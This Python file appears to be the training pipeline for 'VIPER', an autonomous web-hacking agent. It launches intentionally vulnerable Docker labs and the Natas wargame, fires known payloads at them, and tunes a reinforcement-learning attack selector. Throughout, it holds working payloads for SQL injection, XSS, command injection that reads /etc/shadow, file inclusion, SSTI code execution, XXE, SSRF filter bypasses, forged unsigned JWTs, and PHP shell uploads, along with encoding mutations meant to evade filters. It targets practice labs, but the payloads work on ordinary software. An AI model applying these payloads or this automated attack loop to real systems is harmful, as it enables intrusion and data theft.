#!/usr/bin/env python3
"""
VIPER Auto-Trainer - Systematic Training Pipeline
===================================================

Automated training loop that:
1. Spins up vulnerable Docker labs (DVWA, Juice Shop, WebGoat, etc.)
2. Runs VIPER against each lab for every vuln category
3. Measures performance (success rate, detection accuracy, false positives)
4. Updates Brain Q-table, attack patterns, and exploit chains
5. Analyzes failures and generates new payloads/strategies
6. Repeats with increasing difficulty
7. Continues Natas progression from current level
8. Self-benchmarks and tracks improvement over time

Usage:
    python viper_train.py                   # Full auto-training (all labs + Natas)
    python viper_train.py --labs            # Docker labs only
    python viper_train.py --natas           # Continue Natas only
    python viper_train.py --bench           # Benchmark current skills
    python viper_train.py --report          # Show training report
    python viper_train.py --self-improve    # Analyze failures + improve patterns

Author: VIPER Contributors
"""

import asyncio
import aiohttp
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field

sys.path.insert(0, str(Path(__file__).parent / "core"))
sys.path.insert(0, str(Path(__file__).parent))

from viper_brain import ViperBrain, AttackPattern
from viper_mind import ViperMind
from viper_ml import ViperML, QLearningAgent, State, AccessLevel, Action

HACKAGENT_DIR = Path(__file__).parent
MODELS_DIR = HACKAGENT_DIR / "models"
REPORTS_DIR = HACKAGENT_DIR / "reports"
TRAINING_DIR = HACKAGENT_DIR / "training"
TRAINING_DIR.mkdir(exist_ok=True)

TRAINING_STATE = TRAINING_DIR / "training_state.json"
TRAINING_LOG = TRAINING_DIR / "training_log.jsonl"
BENCHMARK_HISTORY = TRAINING_DIR / "benchmark_history.json"


# =============================================================================
# LAB DEFINITIONS - Vulnerable apps with known vuln endpoints
# =============================================================================

@dataclass
class VulnEndpoint:
    """A specific vulnerable endpoint for training."""
    vuln_type: str          # xss, sqli, lfi, cmdi, ssti, ssrf, etc.
    path: str               # URL path
    method: str = "GET"     # HTTP method
    param: str = ""         # Vulnerable parameter
    payload: str = ""       # Known-good payload
    success_marker: str = ""  # What indicates success
    difficulty: int = 1     # 1=easy, 2=medium, 3=hard
    setup_required: str = ""  # Any setup needed first (e.g., login)


@dataclass
class TrainingLab:
    """A vulnerable application for training."""
    name: str
    image: str              # Docker image
    port: int               # Exposed port
    container_name: str
    ready_path: str = "/"   # Path to check if app is ready
    ready_marker: str = ""  # Text that confirms app is running
    setup_steps: List[str] = field(default_factory=list)  # POST requests for initial setup
    endpoints: List[VulnEndpoint] = field(default_factory=list)


# DVWA - Damn Vulnerable Web Application
DVWA_ENDPOINTS = [
    # XSS Reflected (Low)
    VulnEndpoint("xss", "/vulnerabilities/xss_r/", "GET", "name",
                 "<script>alert('viper')</script>", "alert('viper')", 1),
    # XSS Stored (Low)
    VulnEndpoint("xss_stored", "/vulnerabilities/xss_s/", "POST", "mtxMessage",
                 "<script>alert('viper')</script>", "alert('viper')", 1,
                 setup_required="login"),
    # SQLi (Low)
    VulnEndpoint("sqli", "/vulnerabilities/sqli/", "GET", "id",
                 "' OR '1'='1'-- -", "First name:", 1),
    # SQLi Blind (Low)
    VulnEndpoint("sqli_blind", "/vulnerabilities/sqli_blind/", "GET", "id",
                 "1' AND 1=1#", "User ID exists", 2),
    # Command Injection (Low)
    VulnEndpoint("cmdi", "/vulnerabilities/exec/", "POST", "ip",
                 "127.0.0.1;id", "uid=", 1),
    # LFI (Low)
    VulnEndpoint("lfi", "/vulnerabilities/fi/", "GET", "page",
                 "../../../../../../etc/passwd", "root:", 1),
    # File Upload (Low)
    VulnEndpoint("file_upload", "/vulnerabilities/upload/", "POST", "uploaded",
                 "shell.php", "succesfully uploaded", 1),
    # CSRF
    VulnEndpoint("csrf", "/vulnerabilities/csrf/", "GET", "password_new",
                 "test123", "Password Changed", 1),
    # Brute Force
    VulnEndpoint("brute", "/vulnerabilities/brute/", "GET", "username",
                 "admin", "Welcome to the password", 2),
]

# Juice Shop - Modern OWASP Top 10
JUICESHOP_ENDPOINTS = [
    # SQLi in login
    VulnEndpoint("sqli", "/rest/user/login", "POST", "email",
                 "' OR 1=1--", "authentication", 1),
    # XSS in search
    VulnEndpoint("xss", "/", "GET", "q",
                 "<iframe src='javascript:alert(1)'>", "iframe", 2),
    # Broken Auth - password reset
    VulnEndpoint("auth_bypass", "/rest/user/reset-password", "POST", "email",
                 "admin@juice-sh.op", "email", 2),
    # IDOR - other user's basket
    VulnEndpoint("idor", "/rest/basket/2", "GET", "",
                 "", "Products", 2),
    # Sensitive data exposure
    VulnEndpoint("info_disclosure", "/ftp/", "GET", "",
                 "", "acquisitions.md", 1),
    # XXE
    VulnEndpoint("xxe", "/api/Products/1", "GET", "",
                 "", "description", 2),
    # Open redirect
    VulnEndpoint("open_redirect", "/redirect", "GET", "to",
                 "https://evil.com", "evil.com", 2),
]

# WebGoat - OWASP teaching platform
WEBGOAT_ENDPOINTS = [
    VulnEndpoint("sqli", "/WebGoat/SqlInjection/attack5a", "POST", "account",
                 "' OR '1'='1", "Smith", 1),
    VulnEndpoint("xss", "/WebGoat/CrossSiteScripting/attack5a", "POST", "field1",
                 "<script>alert('xss')</script>", "script", 1),
    VulnEndpoint("xxe", "/WebGoat/xxe/simple", "POST", "",
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>',
                 "root:", 2),
    VulnEndpoint("idor", "/WebGoat/IDOR/profile/2342384", "GET", "",
                 "", "role", 2),
    VulnEndpoint("ssrf", "/WebGoat/SSRF/task1", "POST", "url",
                 "http://ifconfig.pro", "ifconfig", 2),
    VulnEndpoint("jwt", "/WebGoat/JWT/secret/gettoken", "GET", "",
                 "", "token", 3),
]

# bWAPP - Buggy Web Application
BWAPP_ENDPOINTS = [
    VulnEndpoint("sqli", "/sqli_1.php", "GET", "title",
                 "' OR 1=1-- -", "Iron Man", 1),
    VulnEndpoint("xss", "/xss_get.php", "GET", "firstname",
                 "<script>alert(1)</script>", "alert(1)", 1),
    VulnEndpoint("cmdi", "/commandi.php", "POST", "target",
                 "127.0.0.1;id", "uid=", 1),
    VulnEndpoint("lfi", "/rlfi.php", "GET", "language",
                 "../../../../../../etc/passwd", "root:", 1),
    VulnEndpoint("ssrf", "/ssrf-1.php", "GET", "url",
                 "http://127.0.0.1/robots.txt", "User-agent", 2),
    VulnEndpoint("ssti", "/ssti.php", "POST", "name",
                 "{{7*7}}", "49", 2),
    VulnEndpoint("xxe", "/xxe-1.php", "POST", "",
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>&xxe;</login></reset>',
                 "root:", 2),
]

# Hackazon - Modern realistic e-commerce app
HACKAZON_ENDPOINTS = [
    VulnEndpoint("sqli", "/search", "GET", "searchString",
                 "' UNION SELECT 1,2,3,4,5-- -", "union", 2),
    VulnEndpoint("xss", "/search", "GET", "searchString",
                 "<img src=x onerror=alert(1)>", "onerror", 1),
    VulnEndpoint("cmdi", "/", "GET", "",
                 "", "", 3),
    VulnEndpoint("open_redirect", "/user/login", "GET", "return_url",
                 "https://evil.com", "evil.com", 2),
]


TRAINING_LABS = [
    TrainingLab(
        name="DVWA",
        image="vulnerables/web-dvwa",
        port=4280,
        container_name="viper-dvwa",
        ready_path="/login.php",
        ready_marker="login",
        setup_steps=[
            # Login first, then set security to low
            "POST:/login.php:username=admin&password=password&Login=Login",
            "GET:/setup.php",
            "POST:/setup.php:create_db=Create+/+Reset+Database",
        ],
        endpoints=DVWA_ENDPOINTS,
    ),
    TrainingLab(
        name="Juice Shop",
        image="bkimminich/juice-shop",
        port=4300,
        container_name="viper-juiceshop",
        ready_path="/",
        ready_marker="OWASP Juice Shop",
        endpoints=JUICESHOP_ENDPOINTS,
    ),
    TrainingLab(
        name="bWAPP",
        image="raesene/bwapp",
        port=4380,
        container_name="viper-bwapp",
        ready_path="/login.php",
        ready_marker="bWAPP",
        setup_steps=[
            "GET:/install.php?install=yes",
        ],
        endpoints=BWAPP_ENDPOINTS,
    ),
    TrainingLab(
        name="WebGoat",
        image="webgoat/webgoat",
        port=4480,
        container_name="viper-webgoat",
        ready_path="/WebGoat/login",
        ready_marker="WebGoat",
        endpoints=WEBGOAT_ENDPOINTS,
    ),
]


# =============================================================================
# TRAINING STATE
# =============================================================================

@dataclass
class VulnScore:
    """Score for a specific vulnerability type."""
    vuln_type: str
    tests_run: int = 0
    tests_passed: int = 0
    false_positives: int = 0
    avg_time_ms: float = 0
    best_payload: str = ""
    last_trained: str = ""

    @property
    def accuracy(self) -> float:
        return self.tests_passed / max(self.tests_run, 1)

    def to_dict(self):
        return {
            "vuln_type": self.vuln_type,
            "tests_run": self.tests_run,
            "tests_passed": self.tests_passed,
            "false_positives": self.false_positives,
            "avg_time_ms": self.avg_time_ms,
            "best_payload": self.best_payload,
            "accuracy": round(self.accuracy, 3),
            "last_trained": self.last_trained,
        }


class TrainingState:
    """Persistent training state across sessions."""

    def __init__(self):
        self.total_sessions: int = 0
        self.total_tests: int = 0
        self.total_passed: int = 0
        self.vuln_scores: Dict[str, VulnScore] = {}
        self.lab_completions: Dict[str, int] = {}
        self.natas_level: int = 0
        self.last_session: str = ""
        self.improvement_log: List[Dict] = []
        self.load()

    def load(self):
        if TRAINING_STATE.exists():
            data = json.loads(TRAINING_STATE.read_text())
            self.total_sessions = data.get("total_sessions", 0)
            self.total_tests = data.get("total_tests", 0)
            self.total_passed = data.get("total_passed", 0)
            self.natas_level = data.get("natas_level", 0)
            self.last_session = data.get("last_session", "")
            self.lab_completions = data.get("lab_completions", {})
            self.improvement_log = data.get("improvement_log", [])[-100:]
            for vt, vs in data.get("vuln_scores", {}).items():
                self.vuln_scores[vt] = VulnScore(**vs) if isinstance(vs, dict) else VulnScore(vt)

    def save(self):
        data = {
            "total_sessions": self.total_sessions,
            "total_tests": self.total_tests,
            "total_passed": self.total_passed,
            "natas_level": self.natas_level,
            "last_session": self.last_session,
            "lab_completions": self.lab_completions,
            "improvement_log": self.improvement_log[-100:],
            "vuln_scores": {vt: vs.to_dict() for vt, vs in self.vuln_scores.items()},
        }
        TRAINING_STATE.write_text(json.dumps(data, indent=2))

    def record_test(self, vuln_type: str, passed: bool, time_ms: float,
                    payload: str = "", false_positive: bool = False):
        if vuln_type not in self.vuln_scores:
            self.vuln_scores[vuln_type] = VulnScore(vuln_type)
        vs = self.vuln_scores[vuln_type]
        vs.tests_run += 1
        self.total_tests += 1
        if passed:
            vs.tests_passed += 1
            self.total_passed += 1
            if payload:
                vs.best_payload = payload
        if false_positive:
            vs.false_positives += 1
        # Running average
        vs.avg_time_ms = (vs.avg_time_ms * (vs.tests_run - 1) + time_ms) / vs.tests_run
        vs.last_trained = datetime.now().isoformat()

    def get_weakest_vulns(self, n: int = 5) -> List[str]:
        """Get vuln types with lowest accuracy for focused training."""
        all_types = [
            "xss", "sqli", "cmdi", "lfi", "ssti", "ssrf", "xxe",
            "idor", "file_upload", "auth_bypass", "open_redirect",
            "cors_misconfig", "deserialization", "jwt",
        ]
        scores = []
        for vt in all_types:
            if vt in self.vuln_scores:
                scores.append((vt, self.vuln_scores[vt].accuracy))
            else:
                scores.append((vt, 0.0))  # Never tested = weakest
        scores.sort(key=lambda x: x[1])
        return [s[0] for s in scores[:n]]


# =============================================================================
# DOCKER LAB MANAGER
# =============================================================================

class DockerLabManager:
    """Manages Docker-based vulnerable labs."""

    @staticmethod
    def is_docker_available() -> bool:
        try:
            result = subprocess.run(["docker", "info"], capture_output=True, timeout=10)
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def is_running(container_name: str) -> bool:
        try:
            result = subprocess.run(
                ["docker", "inspect", "-f", "{{.State.Running}}", container_name],
                capture_output=True, text=True, timeout=10
            )
            return "true" in result.stdout.lower()
        except Exception:
            return False

    @staticmethod
    def start_lab(lab: TrainingLab) -> bool:
        """Start a training lab container."""
        print(f"  [*] Starting {lab.name}...")

        if DockerLabManager.is_running(lab.container_name):
            print(f"  [+] {lab.name} already running")
            return True

        # Remove stopped container if exists
        subprocess.run(
            ["docker", "rm", "-f", lab.container_name],
            capture_output=True, timeout=30
        )

        # Start container
        cmd = [
            "docker", "run", "-d",
            "--name", lab.container_name,
            "-p", f"{lab.port}:80" if lab.port != 4300 else f"{lab.port}:3000",
            lab.image
        ]
        # WebGoat uses 8080 internally
        if "webgoat" in lab.image:
            cmd = [
                "docker", "run", "-d",
                "--name", lab.container_name,
                "-p", f"{lab.port}:8080",
                "-e", "WEBGOAT_PORT=8080",
                lab.image
            ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            print(f"  [-] Failed to start {lab.name}: {result.stderr[:200]}")
            return False

        # Wait for ready
        print(f"  [*] Waiting for {lab.name} to be ready...")
        for attempt in range(30):
            try:
                import urllib.request
                url = f"http://127.0.0.1:{lab.port}{lab.ready_path}"
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "VIPER-Trainer/1.0")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    if lab.ready_marker.lower() in body.lower():
                        print(f"  [+] {lab.name} is ready!")
                        return True
            except Exception:
                pass
            time.sleep(2)

        print(f"  [-] {lab.name} didn't become ready in time")
        return False

    @staticmethod
    def stop_lab(lab: TrainingLab):
        subprocess.run(
            ["docker", "rm", "-f", lab.container_name],
            capture_output=True, timeout=30
        )

    @staticmethod
    def stop_all():
        for lab in TRAINING_LABS:
            DockerLabManager.stop_lab(lab)


# =============================================================================
# CORE TRAINER
# =============================================================================

class ViperTrainer:
    """
    Automated VIPER training engine.

    Runs VIPER against known vulnerable endpoints, measures accuracy,
    updates ML models, and self-improves.
    """

    def __init__(self):
        self.brain = ViperBrain()
        self.mind = ViperMind()
        self.state = TrainingState()
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[Dict] = []

    def log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] [{level}] {msg}"
        print(line)
        with open(TRAINING_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                "ts": datetime.now().isoformat(),
                "level": level,
                "msg": msg
            }) + "\n")

    async def request(self, url: str, method: str = "GET",
                      data: str = None, headers: dict = None,
                      cookies: dict = None) -> Tuple[int, str, Dict]:
        try:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=15), "ssl": False}
            if data:
                kwargs["data"] = data
            if headers:
                kwargs["headers"] = headers
            if cookies:
                kwargs["cookies"] = cookies
            async with self.session.request(method, url, **kwargs) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}

    # -------------------------------------------------------------------------
    # LAB TRAINING
    # -------------------------------------------------------------------------

    async def train_on_lab(self, lab: TrainingLab):
        """Train VIPER on all endpoints in a lab."""
        base_url = f"http://127.0.0.1:{lab.port}"
        self.log(f"=== Training on {lab.name} ({base_url}) ===")

        # Run setup steps (login, DB init, etc.)
        cookies = {}
        for step in lab.setup_steps:
            parts = step.split(":", 2)
            method = parts[0]
            path = parts[1]
            body = parts[2] if len(parts) > 2 else None
            url = f"{base_url}{path}"
            status, resp_body, resp_headers = await self.request(url, method, data=body)
            # Capture session cookies
            if "Set-Cookie" in resp_headers:
                for cookie_str in resp_headers.get("Set-Cookie", "").split(","):
                    if "=" in cookie_str:
                        key, _, val = cookie_str.strip().split(";")[0].partition("=")
                        cookies[key.strip()] = val.strip()
            self.log(f"  Setup {method} {path} -> {status}")

        # Test each endpoint
        passed = 0
        total = len(lab.endpoints)

        for ep in lab.endpoints:
            result = await self.test_endpoint(base_url, ep, cookies)
            if result["passed"]:
                passed += 1

            # Update training state
            self.state.record_test(
                ep.vuln_type, result["passed"],
                result["time_ms"], result.get("payload", ""),
                result.get("false_positive", False)
            )

            # Update brain
            context = {
                "url": f"{base_url}{ep.path}",
                "page_content": result.get("response", ""),
                "access_level": 1,
                "vulns_found": [],
                "has_php": ".php" in ep.path,
                "has_input": bool(ep.param),
                "has_dav": False,
                "has_login": "login" in ep.path.lower(),
            }
            reward = 10 if result["passed"] else -5
            self.brain.update(context, ep.vuln_type, reward, context)

        self.log(f"  Results: {passed}/{total} passed ({passed/max(total,1)*100:.0f}%)")
        self.state.lab_completions[lab.name] = self.state.lab_completions.get(lab.name, 0) + 1

    async def test_endpoint(self, base_url: str, ep: VulnEndpoint,
                            cookies: dict = None) -> Dict:
        """Test a single vulnerable endpoint."""
        url = f"{base_url}{ep.path}"
        start = time.time()
        result = {"passed": False, "time_ms": 0, "vuln_type": ep.vuln_type}

        try:
            if ep.method == "GET" and ep.param:
                test_url = f"{url}?{ep.param}={urllib.parse.quote(ep.payload)}"
                status, body, headers = await self.request(test_url, cookies=cookies)
            elif ep.method == "POST" and ep.param:
                data = f"{ep.param}={urllib.parse.quote(ep.payload)}"
                status, body, headers = await self.request(
                    url, "POST", data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    cookies=cookies
                )
            else:
                status, body, headers = await self.request(url, ep.method, cookies=cookies)

            result["response"] = body[:2000]
            result["status"] = status

            # Check if the known payload worked
            if ep.success_marker and ep.success_marker.lower() in body.lower():
                result["passed"] = True
                result["payload"] = ep.payload
                self.log(f"  [+] {ep.vuln_type} @ {ep.path} -> PASS", "SUCCESS")
            else:
                self.log(f"  [-] {ep.vuln_type} @ {ep.path} -> FAIL")

            # Now test with VIPER's own detection (Brain chooses attack)
            context = {
                "url": url,
                "page_content": body,
                "access_level": 1,
                "vulns_found": [],
                "has_php": ".php" in ep.path,
                "has_input": bool(ep.param),
                "has_dav": False,
                "has_login": "login" in body.lower(),
            }
            brain_choice = self.brain.choose_attack(context)
            result["brain_choice"] = brain_choice
            result["correct_choice"] = brain_choice == ep.vuln_type or (
                ep.vuln_type in brain_choice or brain_choice in ep.vuln_type
            )

        except Exception as e:
            self.log(f"  [!] Error testing {ep.path}: {e}", "ERROR")

        result["time_ms"] = (time.time() - start) * 1000
        self.results.append(result)
        return result

    # -------------------------------------------------------------------------
    # NATAS CONTINUATION
    # -------------------------------------------------------------------------

    async def train_natas(self, max_levels: int = 34):
        """Continue Natas training from last solved level."""
        from viper_natas import NatasSolver

        self.log("=== Natas Training ===")
        solver = NatasSolver()
        self.log(f"  Starting from level {solver.current_level}")
        self.state.natas_level = solver.current_level

        async with aiohttp.ClientSession() as session:
            await solver.train(session, max_levels=max_levels)

        self.state.natas_level = solver.current_level
        self.log(f"  Reached level {solver.current_level}")

        # Feed Natas learnings into Brain
        self.brain.learn_from_natas()

    # -------------------------------------------------------------------------
    # SELF-IMPROVEMENT
    # -------------------------------------------------------------------------

    def self_improve(self):
        """Analyze failures and improve attack patterns."""
        self.log("=== Self-Improvement Analysis ===")

        improvements = []

        # 1. Find weak vuln types
        weak = self.state.get_weakest_vulns(5)
        self.log(f"  Weakest areas: {weak}")

        # 2. For each weak area, enhance patterns
        for vuln_type in weak:
            vs = self.state.vuln_scores.get(vuln_type)
            if vs and vs.accuracy < 0.5 and vs.tests_run > 0:
                self.log(f"  Improving {vuln_type} (accuracy: {vs.accuracy:.0%})")

                # Add more payloads from our payload engine
                pattern = self.brain.attack_patterns.get(vuln_type)
                if pattern:
                    new_payloads = self._generate_variant_payloads(vuln_type, pattern.payloads)
                    if new_payloads:
                        pattern.payloads.extend(new_payloads)
                        pattern.payloads = list(set(pattern.payloads))  # Dedupe
                        improvements.append({
                            "vuln_type": vuln_type,
                            "action": "added_payloads",
                            "count": len(new_payloads),
                        })
                        self.log(f"    Added {len(new_payloads)} new payloads")

            elif not vs or vs.tests_run == 0:
                # Never tested - ensure pattern exists
                if vuln_type not in self.brain.attack_patterns:
                    self.log(f"  Creating new pattern for {vuln_type}")
                    self._create_pattern(vuln_type)
                    improvements.append({
                        "vuln_type": vuln_type,
                        "action": "created_pattern",
                    })

        # 3. Adjust Q-learning parameters based on performance
        overall_accuracy = self.state.total_passed / max(self.state.total_tests, 1)
        if overall_accuracy > 0.7:
            # Doing well - reduce exploration, exploit more
            self.log("  Good accuracy - reducing exploration (epsilon)")
            improvements.append({"action": "reduce_epsilon", "reason": f"accuracy={overall_accuracy:.0%}"})
        elif overall_accuracy < 0.3:
            # Struggling - increase exploration
            self.log("  Low accuracy - increasing exploration (epsilon)")
            improvements.append({"action": "increase_epsilon", "reason": f"accuracy={overall_accuracy:.0%}"})

        # 4. Prune consistently failing payloads
        for name, pattern in self.brain.attack_patterns.items():
            if pattern.times_used > 10 and pattern.success_rate < 0.1:
                self.log(f"  Pruning low-success pattern: {name} ({pattern.success_rate:.0%})")
                # Don't delete, but reset to give it another chance with new payloads
                pattern.times_used = max(pattern.times_used // 2, 1)
                pattern.times_succeeded = max(pattern.times_succeeded, 0)
                improvements.append({
                    "vuln_type": name,
                    "action": "reset_stats",
                    "reason": "consistently_failing",
                })

        # 5. Save improvements
        self.brain.save()
        self.mind.save_state()

        self.state.improvement_log.append({
            "timestamp": datetime.now().isoformat(),
            "improvements": improvements,
            "overall_accuracy": overall_accuracy,
            "weak_areas": weak,
        })
        self.state.save()

        self.log(f"  Applied {len(improvements)} improvements")
        return improvements

    def _generate_variant_payloads(self, vuln_type: str, existing: List[str]) -> List[str]:
        """Generate payload variants via encoding mutations."""
        new = []
        ENCODINGS = {
            "url": lambda p: urllib.parse.quote(p),
            "double_url": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            "case_swap": lambda p: p.swapcase(),
            "space_to_tab": lambda p: p.replace(" ", "\t"),
            "space_to_plus": lambda p: p.replace(" ", "+"),
            "null_byte": lambda p: p + "%00",
        }

        # Vuln-specific new payloads
        EXTRA_PAYLOADS = {
            "xss": [
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<video src=x onerror=alert(1)>',
                'javascript:alert(1)//',
                '"><img src=x onerror=confirm(1)>',
            ],
            "sqli": [
                "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
                "' UNION SELECT username,password FROM users-- -",
                "1' ORDER BY 10-- -",
                "-1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables-- -",
                "admin' AND '1'='1",
            ],
            "cmdi": [
                "127.0.0.1\nid",
                "127.0.0.1%0aid",
                "$(sleep 2)",
                "127.0.0.1|cat /etc/shadow",
                "127.0.0.1;whoami",
            ],
            "lfi": [
                "php://input",
                "expect://id",
                "/proc/self/environ",
                "....//....//....//....//....//etc/shadow",
                "php://filter/read=convert.base64-encode/resource=index.php",
            ],
            "ssti": [
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.System).getenv()}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
            ],
            "ssrf": [
                "http://0x7f000001/",
                "http://017700000001/",
                "http://127.1/",
                "dict://127.0.0.1:6379/INFO",
                "gopher://127.0.0.1:3306/_",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:22"> %xxe;]>',
            ],
        }

        # Add type-specific payloads
        for p in EXTRA_PAYLOADS.get(vuln_type, []):
            if p not in existing:
                new.append(p)

        # Generate encoded variants of first 3 existing payloads
        for payload in existing[:3]:
            for enc_name, enc_fn in ENCODINGS.items():
                try:
                    variant = enc_fn(payload)
                    if variant not in existing and variant not in new:
                        new.append(variant)
                except Exception:
                    pass

        return new[:10]  # Cap at 10 new payloads

    def _create_pattern(self, vuln_type: str):
        """Create a new attack pattern from scratch."""
        TEMPLATES = {
            "xxe": AttackPattern(
                attack_type="xxe",
                indicators=["xml", "soap", "DOCTYPE", "content-type: application/xml"],
                payloads=[
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                ],
                success_markers=["root:", "passwd"],
                success_rate=0.25,
            ),
            "jwt": AttackPattern(
                attack_type="jwt",
                indicators=["jwt", "bearer", "eyJ", "authorization", "token"],
                payloads=[
                    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
                ],
                success_markers=["admin", "welcome", "authorized"],
                success_rate=0.2,
            ),
            "file_upload": AttackPattern(
                attack_type="file_upload",
                indicators=["upload", "file", "attachment", "multipart"],
                payloads=[
                    "shell.php", "shell.php.jpg", "shell.phtml",
                ],
                success_markers=["uploaded", "success"],
                success_rate=0.3,
            ),
            "auth_bypass": AttackPattern(
                attack_type="auth_bypass",
                indicators=["login", "auth", "admin", "password"],
                payloads=[
                    "admin'--", "' OR '1'='1'--",
                ],
                success_markers=["welcome", "dashboard", "admin"],
                success_rate=0.3,
            ),
        }
        if vuln_type in TEMPLATES:
            self.brain.attack_patterns[vuln_type] = TEMPLATES[vuln_type]

    # -------------------------------------------------------------------------
    # BENCHMARKING
    # -------------------------------------------------------------------------

    def benchmark(self) -> Dict:
        """Generate a benchmark report of VIPER's current capabilities."""
        self.log("=== VIPER Benchmark Report ===")

        report = {
            "timestamp": datetime.now().isoformat(),
            "total_sessions": self.state.total_sessions,
            "total_tests": self.state.total_tests,
            "overall_accuracy": self.state.total_passed / max(self.state.total_tests, 1),
            "natas_level": self.state.natas_level,
            "brain_stats": self.brain.get_stats(),
            "mind_attack_surface": self.mind.get_attack_surface(),
            "vuln_scores": {},
            "weakest": self.state.get_weakest_vulns(5),
            "strongest": [],
        }

        # Per-vuln breakdown
        all_scores = []
        for vt, vs in self.state.vuln_scores.items():
            report["vuln_scores"][vt] = vs.to_dict()
            all_scores.append((vt, vs.accuracy, vs.tests_run))

        all_scores.sort(key=lambda x: x[1], reverse=True)
        report["strongest"] = [s[0] for s in all_scores[:5] if s[1] > 0]

        # Print summary
        self.log(f"  Overall Accuracy: {report['overall_accuracy']:.0%}")
        self.log(f"  Total Tests: {report['total_tests']}")
        self.log(f"  Natas Level: {report['natas_level']}")
        self.log(f"  Brain Patterns: {report['brain_stats']['patterns_known']}")
        self.log(f"  Weakest: {report['weakest']}")
        self.log(f"  Strongest: {report['strongest']}")

        self.log("\n  Per-Vuln Accuracy:")
        for vt, acc, runs in all_scores:
            bar = "█" * int(acc * 20) + "░" * (20 - int(acc * 20))
            self.log(f"    {vt:20s} {bar} {acc:5.0%} ({runs} tests)")

        # Save benchmark history
        history = []
        if BENCHMARK_HISTORY.exists():
            history = json.loads(BENCHMARK_HISTORY.read_text())
        history.append(report)
        BENCHMARK_HISTORY.write_text(json.dumps(history[-50:], indent=2, default=str))

        return report

    # -------------------------------------------------------------------------
    # MAIN TRAINING LOOP
    # -------------------------------------------------------------------------

    async def run_full_training(self, cycles: int = 3):
        """
        Full automated training pipeline:
        1. Start Docker labs
        2. Train on each lab
        3. Continue Natas
        4. Self-improve
        5. Benchmark
        6. Repeat
        """
        self.log("=" * 60)
        self.log("VIPER AUTO-TRAINER")
        self.log("=" * 60)
        self.state.total_sessions += 1
        self.state.last_session = datetime.now().isoformat()

        docker_available = DockerLabManager.is_docker_available()
        if not docker_available:
            self.log("[!] Docker not available - skipping lab training", "WARN")

        for cycle in range(1, cycles + 1):
            self.log(f"\n{'='*60}")
            self.log(f"TRAINING CYCLE {cycle}/{cycles}")
            self.log(f"{'='*60}")

            # Phase 1: Docker labs
            if docker_available:
                for lab in TRAINING_LABS:
                    if DockerLabManager.start_lab(lab):
                        async with aiohttp.ClientSession() as self.session:
                            await self.train_on_lab(lab)
                    else:
                        self.log(f"  Skipping {lab.name} (couldn't start)", "WARN")

            # Phase 2: Natas
            try:
                await self.train_natas()
            except Exception as e:
                self.log(f"  Natas training error: {e}", "ERROR")

            # Phase 3: Self-improve based on results
            self.self_improve()

            # Phase 4: Benchmark
            self.benchmark()

            # Save state
            self.state.save()
            self.brain.save()
            self.mind.save_state()

            self.log(f"\nCycle {cycle} complete.")

        # Cleanup
        if docker_available:
            self.log("\n[*] Stopping training labs...")
            DockerLabManager.stop_all()

        self.log("\n" + "=" * 60)
        self.log("TRAINING COMPLETE")
        self.log("=" * 60)
        self.benchmark()

    async def run_labs_only(self):
        """Train on Docker labs only."""
        if not DockerLabManager.is_docker_available():
            self.log("[!] Docker not available", "ERROR")
            return
        self.state.total_sessions += 1
        self.state.last_session = datetime.now().isoformat()

        for lab in TRAINING_LABS:
            if DockerLabManager.start_lab(lab):
                async with aiohttp.ClientSession() as self.session:
                    await self.train_on_lab(lab)

        self.self_improve()
        self.benchmark()
        self.state.save()
        self.brain.save()
        DockerLabManager.stop_all()

    async def run_natas_only(self):
        """Continue Natas training only."""
        self.state.total_sessions += 1
        await self.train_natas()
        self.brain.save()
        self.state.save()
        self.benchmark()


# =============================================================================
# CLI
# =============================================================================

def print_report():
    """Print existing training report."""
    state = TrainingState()
    print("\n" + "=" * 60)
    print("VIPER TRAINING REPORT")
    print("=" * 60)
    print(f"Sessions: {state.total_sessions}")
    print(f"Total Tests: {state.total_tests}")
    print(f"Overall Accuracy: {state.total_passed / max(state.total_tests, 1):.0%}")
    print(f"Natas Level: {state.natas_level}")
    print(f"Last Session: {state.last_session}")

    if state.vuln_scores:
        print(f"\nPer-Vuln Scores:")
        scores = sorted(state.vuln_scores.values(), key=lambda x: x.accuracy, reverse=True)
        for vs in scores:
            bar = "█" * int(vs.accuracy * 20) + "░" * (20 - int(vs.accuracy * 20))
            print(f"  {vs.vuln_type:20s} {bar} {vs.accuracy:5.0%} ({vs.tests_run} tests, {vs.avg_time_ms:.0f}ms avg)")

